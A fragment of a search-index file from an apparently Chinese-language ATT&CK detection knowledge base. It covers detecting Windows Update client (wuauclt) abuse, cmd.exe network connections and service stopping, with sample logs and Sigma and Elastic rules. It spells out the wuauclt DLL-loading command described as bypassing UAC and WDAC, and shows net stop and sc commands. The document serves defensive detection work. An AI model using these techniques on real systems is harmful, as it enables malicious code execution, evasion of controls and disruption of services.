Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f\u884c\u4e3a\u68c0\u6d4b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#t1105-windows-update","text":"","title":"T1105-Windows Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f\u884c\u4e3a\u68c0\u6d4b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u6216\u5176\u4ed6\u6587\u4ef6\u4ece\u5916\u90e8\u7cfb\u7edf\u8f6c\u79fb\u5230\u88ab\u653b\u9677\u7684\u73af\u5883\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u4ece\u5916\u90e8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\u4e2d\u590d\u5236\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5c06\u5de5\u5177\u5e26\u5165\u88ab\u653b\u9677\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u6216\u901a\u8fc7\u4e0e\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u5982FTP\uff09\u7684\u66ff\u4ee3\u534f\u8bae\u590d\u5236\u6587\u4ef6\u3002\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5728Mac\u548cLinux\u4e0a\u4f7f\u7528scp\u3001rsync\u548csftp\u7b49\u672c\u673a\u5de5\u5177\u8fdb\u884c\u590d\u5236\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_1","text":"\u63f4\u5f15\u5916\u5a92Bleeping Computer\u62a5\u9053\uff0cMDSec\u7814\u7a76\u4eba\u5458David Middlehurst\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u884c\u9009\u9879\u4ece\u4efb\u610f\u7279\u5236\u7684DLL\u52a0\u8f7dwuauclt\uff0c\u4ece\u800c\u5728Windows 10\u7cfb\u7edf\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801\uff1a wuauclt.exe /UpdateDeploymentProvider [path_to_dll] /RunHandlerComServer \u8be5\u6280\u5de7\u7ed5\u8fc7Windows\u7528\u6237\u5e10\u6237\u63a7\u5236\uff08UAC\uff09\u6216Windows Defender\u5e94\u7528\u7a0b\u5e8f\u63a7\u5236\uff08WDAC\uff09\uff0c\u53ef\u7528\u4e8e\u5728\u5df2\u7ecf\u53d7\u5230\u5a01\u80c1\u7684\u7cfb\u7edf\u4e0a\u83b7\u5f97\u6301\u4e45\u6027\u3002\u4e4b\u6240\u4ee5\u80fd\u591f\u53d1\u73b0\uff0c\u662f\u56e0\u4e3a\u4ed6\u53d1\u73b0\u5df2\u7ecf\u6709\u9ed1\u5ba2\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u6267\u884c\u653b\u51fb\u884c\u4e3a\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7\u3001\u5176\u4ed6EDR\u7c7b\u4ea7\u54c1","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_4","text":"\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 SourceSecurity LevelError DescriptionA new process has been created. Creator Subject: Security ID: SYSTEM Account Name: - Account Domain: - Logon ID: 0x3E7 Target Subject: Security ID: NULL SID Account Name: - Account Domain: - Logon ID: 0x0 Process Information: New Process ID: 0x7b4 New Process Name: C:\\Windows\\System32\\lsass.exe Token Elevation Type: %%1936 Mandatory Label: Mandatory Label\\System Mandatory Level Creator Process ID: 0x71c Creator Process Name: C:\\Windows\\System32\\wininit.exe Process Command Line: #\u9700\u8981\u5355\u72ec\u914d\u7f6e\uff0c\u5f00\u542f Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy. Type 1 is a full token with no privileges removed or groups disabled. A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#sigma","text":"title: Windows Update Client\u6ee5\u7528\u68c0\u6d4b status: experimental description: Detects code execution via the Windows Update client (wuauclt) references: - https://www.nruan.com/75037.html tags: - attack.command_and_control - attack.execution - attack.t1105 - attack.t1218 logsource: product: windows #windows service: process_creation #\u5b89\u5168\u4e8b\u4ef6\uff0c\u8fdb\u7a0b\u521b\u5efa detection: selection: ProcessCommandline|contains|all: #\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u5305\u542b\u4ee5\u4e0b\u4efb\u610f\u4e00\u9879 - '/UpdateDeploymentProvider' - '/RunHandlerComServer' Image|endswith: - '\\wuauclt.exe' #\u8fdb\u7a0b\u8def\u5f84\u4e3a\u4ee5wuauclt.exe condition: selection falsepositives: - Unknown level: high","title":"sigma\u89c4\u5219"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_6","text":"\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u5efa\u8bae"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-Windows%20Update%E5%8F%AF%E6%BB%A5%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1105 https://attack.mitre.org/techniques/T1105 Windows Update\u88ab\u53d1\u73b0\u53ef\u6ee5\u7528\u4e8e\u6267\u884c\u6076\u610f\u7a0b\u5e8f https://www.nruan.com/75037.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/","text":"T1105-win-\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u6216\u5176\u4ed6\u6587\u4ef6\u4ece\u5916\u90e8\u7cfb\u7edf\u8f6c\u79fb\u5230\u88ab\u653b\u9677\u7684\u73af\u5883\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u4ece\u5916\u90e8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\u4e2d\u590d\u5236\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5c06\u5de5\u5177\u5e26\u5165\u88ab\u653b\u9677\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u6216\u901a\u8fc7\u4e0e\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u5982FTP\uff09\u7684\u66ff\u4ee3\u534f\u8bae\u590d\u5236\u6587\u4ef6\u3002\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5728Mac\u548cLinux\u4e0a\u4f7f\u7528scp\u3001rsync\u548csftp\u7b49\u672c\u673a\u5de5\u5177\u8fdb\u884c\u590d\u5236\u3002 \u6d4b\u8bd5\u6848\u4f8b \u8bc6\u522bcmd.exe\u5efa\u7acb\u7f51\u7edc\u8fde\u63a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528cmd.exe\u4ece\u8fdc\u7a0bURL\u4e0b\u8f7d\u6216\u6267\u884c\u6076\u610f\u8f6f\u4ef6\u3002 \u53c2\u8003\u6587\u7ae0\uff1a \u6e17\u900f\u6280\u5de7\u2014\u2014\u901a\u8fc7cmd\u4e0a\u4f20\u6587\u4ef6\u7684N\u79cd\u65b9\u6cd5 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 1752 Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 10.45.45.103 Source Port: 53 Destination Address: 10.45.45.103 Destination Port: 50146 Protocol: 17 Filter Information: Filter Run-Time ID: 5 Layer Name: Receive/Accept Layer Run-Time ID: 44 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u68c0\u6d4b\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 description: \u901a\u8fc7windows\u65e5\u5fd7\u547d\u4ee4\u68c0\u6d4b\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 tags: T1105 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/command-prompt-network-connection.html#command-prompt-network-connection logsource: product: windows service: security detection: selection1: EventID: 5156 Process.name: 'cmd.exe' #Application Name selection2: Destination Address: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 condition: selection1 and not selection2 level: low Elastic rule query process.name:cmd.exe and event.action:\"Network connection detected (rule: NetworkConnect)\" and not destination.ip:(10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16) \u5efa\u8bae \u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1105 https://attack.mitre.org/techniques/T1105 \u68c0\u6d4b\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 https://www.elastic.co/guide/en/siem/guide/current/command-prompt-network-connection.html#command-prompt-network-connection","title":"T1105-win-\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#t1105-win-","text":"","title":"T1105-win-\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5de5\u5177\u6216\u5176\u4ed6\u6587\u4ef6\u4ece\u5916\u90e8\u7cfb\u7edf\u8f6c\u79fb\u5230\u88ab\u653b\u9677\u7684\u73af\u5883\u4e2d\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u4ece\u5916\u90e8\u653b\u51fb\u8005\u63a7\u5236\u7684\u7cfb\u7edf\u4e2d\u590d\u5236\u6587\u4ef6\uff0c\u4ee5\u4fbf\u5c06\u5de5\u5177\u5e26\u5165\u88ab\u653b\u9677\u7684\u7f51\u7edc\u73af\u5883\u4e2d\uff0c\u6216\u901a\u8fc7\u4e0e\u53e6\u4e00\u4e2a\u5de5\u5177\uff08\u5982FTP\uff09\u7684\u66ff\u4ee3\u534f\u8bae\u590d\u5236\u6587\u4ef6\u3002\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5728Mac\u548cLinux\u4e0a\u4f7f\u7528scp\u3001rsync\u548csftp\u7b49\u672c\u673a\u5de5\u5177\u8fdb\u884c\u590d\u5236\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_1","text":"\u8bc6\u522bcmd.exe\u5efa\u7acb\u7f51\u7edc\u8fde\u63a5\u3002\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528cmd.exe\u4ece\u8fdc\u7a0bURL\u4e0b\u8f7d\u6216\u6267\u884c\u6076\u610f\u8f6f\u4ef6\u3002 \u53c2\u8003\u6587\u7ae0\uff1a \u6e17\u900f\u6280\u5de7\u2014\u2014\u901a\u8fc7cmd\u4e0a\u4f20\u6587\u4ef6\u7684N\u79cd\u65b9\u6cd5","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_4","text":"\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 1752 Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 10.45.45.103 Source Port: 53 Destination Address: 10.45.45.103 Destination Port: 50146 Protocol: 17 Filter Information: Filter Run-Time ID: 5 Layer Name: Receive/Accept Layer Run-Time ID: 44","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#sigma","text":"title: \u68c0\u6d4b\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 description: \u901a\u8fc7windows\u65e5\u5fd7\u547d\u4ee4\u68c0\u6d4b\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 tags: T1105 status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/command-prompt-network-connection.html#command-prompt-network-connection logsource: product: windows service: security detection: selection1: EventID: 5156 Process.name: 'cmd.exe' #Application Name selection2: Destination Address: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 condition: selection1 and not selection2 level: low","title":"sigma\u89c4\u5219"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#elastic-rule-query","text":"process.name:cmd.exe and event.action:\"Network connection detected (rule: NetworkConnect)\" and not destination.ip:(10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16)","title":"Elastic rule query"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_6","text":"\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u65e0\u6cd5\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u53ca\u5b50\u7236\u8fdb\u7a0b\uff0c\u5efa\u8bae\u901a\u8fc7sysmon\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u5efa\u8bae"},{"location":"0xB_%E5%91%BD%E4%BB%A4%E4%B8%8E%E6%8E%A7%E5%88%B6/T1105-win-%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_7","text":"MITRE-ATT&CK-T1105 https://attack.mitre.org/techniques/T1105 \u68c0\u6d4b\u547d\u4ee4\u63d0\u793a\u7b26\u7f51\u7edc\u94fe\u63a5 https://www.elastic.co/guide/en/siem/guide/current/command-prompt-network-connection.html#command-prompt-network-connection","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xC_%E6%B8%97%E5%87%BA/","text":"\u6682\u65e0","title":"Index"},{"location":"0xD_%E5%BD%B1%E5%93%8D/T1489-win-%E5%81%9C%E6%AD%A2%E6%9C%8D%E5%8A%A1/","text":"T1489-win-\u505c\u6b62\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u505c\u6b62\u6216\u7981\u7528\u7cfb\u7edf\u4e0a\u7684\u670d\u52a1\uff0c\u4ee5\u4f7f\u5408\u6cd5\u7528\u6237\u65e0\u6cd5\u4f7f\u7528\u8fd9\u4e9b\u670d\u52a1\u3002\u505c\u6b62\u5173\u952e\u670d\u52a1\u53ef\u4ee5\u6291\u5236\u6216\u505c\u6b62\u8fd9\u4e9b\u670d\u52a1\u5bf9\u653b\u51fb\u8005\u5165\u4fb5\u76f8\u5173\u4e8b\u4ef6\u7684\u54cd\u5e94\uff0c\u6216\u8005\u5e2e\u52a9\u653b\u51fb\u8005\u5bf9\u7cfb\u7edf\u73af\u5883\u8fdb\u884c\u7834\u574f\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u7981\u7528\u5bf9\u7ec4\u7ec7\u5f88\u91cd\u8981\u7684\u5355\u4e2a\u670d\u52a1\u6765\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\uff0c\u4f8b\u5982MSExchangeIS\uff0c\u8fd9\u56de\u5bfc\u81f4Exchange\u5185\u5bb9\u65e0\u6cd5\u8bbf\u95ee\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u505c\u6b62\u6216\u7981\u7528\u8bb8\u591a\u6216\u6240\u6709\u670d\u52a1\uff0c\u4ece\u800c\u4f7f\u7cfb\u7edf\u65e0\u6cd5\u4f7f\u7528\u3002\u670d\u52a1\u53ef\u80fd\u4e0d\u5141\u8bb8\u5728\u8fd0\u884c\u65f6\u4fee\u6539\u5176\u5b58\u50a8\u7684\u6570\u636e\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u505c\u6b62\u670d\u52a1\uff0c\u4ece\u800c\u5bf9Exchange\u548cSQL Server\u7b49\u670d\u52a1\u7684\u5b58\u50a8\u6570\u636e\u8fdb\u884c\u9500\u6bc1\u6570\u636e\u548c\u52a0\u5bc6\u6570\u636e\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f7f\u7528Windows\u547d\u4ee4\u884c\u542f\u52a8\u5173\u95ed\u670d\u52a1(net,sc\u7528\u6cd5)\uff0c\u6700\u597d\u662f\u5728\u7ba1\u7406\u5458\u6743\u9650\u4e0b\u4f7f\u7528 net\u7528\u4e8e\u6253\u5f00\u6ca1\u6709\u88ab\u7981\u7528\u7684\u670d\u52a1 NET\u547d\u4ee4\u662f\u529f\u80fd\u5f3a\u5927\u7684\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u6267\u884c\u7684\u5de5\u5177\u3002 \u5b83\u5305\u542b\u4e86\u7ba1\u7406\u7f51\u7edc\u73af\u5883\u3001\u670d\u52a1\u3001\u7528\u6237\u3001\u767b\u9646\u5927\u90e8\u5206\u91cd\u8981\u7684\u7ba1\u7406\u529f\u80fd\uff0c\u5173\u4e8e\u8fd9\u4e9b\u529f\u80fd\u8fd9\u91cc\u4e0d\u518d\u4e00\u4e00\u8bb2\u89e3\uff0c\u5177\u4f53\u53ef\u53c2\u8003\u5fae\u8f6f\u5b98\u65b9\u8bf4\u660e\u3002 \u542f\u52a8\u548c\u5173\u95ed\u670d\u52a1\u7684\u65f6\u5019\uff0c\u5176\u8bed\u6cd5\u662f\uff1a net start \u670d\u52a1\u540d net stop \u670d\u52a1\u540d sc\u53ef\u7528\u4e8e\u6253\u5f00\u88ab\u7981\u7528\u7684\u670d\u52a1 \u4f7f\u7528sc\u7a0b\u5e8f(\u4e5f\u53ef\u4ee5\u67e5\u770b\u670d\u52a1\u72b6\u6001)\u53ef\u4ee5\u521b\u5efa\u670d\u52a1\u3001\u5220\u9664\u670d\u52a1\u3001\u6253\u5f00\u4e0e\u5173\u95ed\u670d\u52a1 sc\u662f\u7528\u4e8e\u4e0e\u670d\u52a1\u63a7\u5236\u7ba1\u7406\u5668\u548c\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\uff0c\u5176\u8bed\u6cd5\u662f\uff1a sc config \u670d\u52a1\u540d start= demand //\u624b\u52a8 sc config \u670d\u52a1\u540d start= auto //\u81ea\u52a8 sc config \u670d\u52a1\u540d start= disabled //\u7981\u7528 sc start \u670d\u52a1\u540d\u3000\u3000\u5f00\u542f\u670d\u52a1 sc stop \u670d\u52a1\u540d\u3000\u3000\u505c\u6b62\u670d\u52a1 sc query \u670d\u52a1\u540d\u3000\u3000\u67e5\u770b\u670d\u52a1\u72b6\u6001 sc delete \u670d\u52a1\u540d \u5220\u9664\u670d\u52a1 sc qc \u670d\u52a1\u540d \u67e5\u770b\u670d\u52a1\u7684\u914d\u7f6e\u4fe1\u606f sc create scname binPath=xxx.exe\u3000\u3000\u521b\u5efa\u670d\u52a1 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u8fd9\u91cc\u53ea\u6f14\u793a\u4f7f\u7528net\u547d\u4ee4\u5173\u95ed\u670d\u52a1\uff0c\u5229\u7528sc\u547d\u4ee4\u5173\u95ed\u670d\u52a1\u7684\u65b9\u6cd5\uff0c\u5728\u8fd9\u91cc\u4e0d\u505a\u6f14\u793a\u3002 C:\\Users\\Administrator>net stop vmtools VMware Tools \u670d\u52a1\u5df2\u6210\u529f\u505c\u6b62\u3002 C:\\Users\\Administrator>net start vmtools VMware Tools \u670d\u52a1\u6b63\u5728\u542f\u52a8 . VMware Tools \u670d\u52a1\u5df2\u7ecf\u542f\u52a8\u6210\u529f\u3002 \u901a\u8fc7\u89c2\u5bdf\u672c\u5730\u670d\u52a1\u4fe1\u606f\uff0c\u53d1\u73b0vmtools\u670d\u52a1\u5df2\u7ecf\u88ab\u5173\u95ed\u3002\u8bb0\u5f97\u662fnet stop\u540e\u9762\u8ddf\u7684\u662f\u670d\u52a1\u540d\u79f0\u3002 \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd7 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x7169C \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xd9c \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\net.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x15d0 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: net stop vmtools \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: windows\u4e0b\u4f7f\u7528net/sc\u547d\u4ee4\u5173\u95ed\u670d\u52a1 description: Windows\u4e0b\u4f7f\u7528net stop/sc stop \u5173\u95ed\u670d\u52a1\uff0c\u7528\u4e8e\u9003\u907f\u76d1\u89c6\u3002 tags: T1489 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u8fdb\u7a0b\u521b\u5efa Processcommandline|contains: - 'net stop' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c - 'sc stop' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection level: low \u5efa\u8bae 